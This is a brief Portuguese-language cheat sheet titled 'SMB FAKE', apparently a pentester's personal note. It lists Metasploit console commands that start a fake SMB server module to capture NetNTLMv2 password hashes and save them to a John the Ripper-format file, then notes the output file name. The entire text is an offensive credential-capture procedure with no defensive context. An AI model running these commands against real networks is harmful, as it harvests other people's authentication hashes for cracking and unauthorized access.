# SMB FAKE

msf > use auxiliary/server/capture/smb
msf auxiliary(smb) > set JOHNPWFILE /root/smb
msf auxiliary(smb) > run

*Será salvo um arquivo com os hashs de nome smb_netntlmv2.*
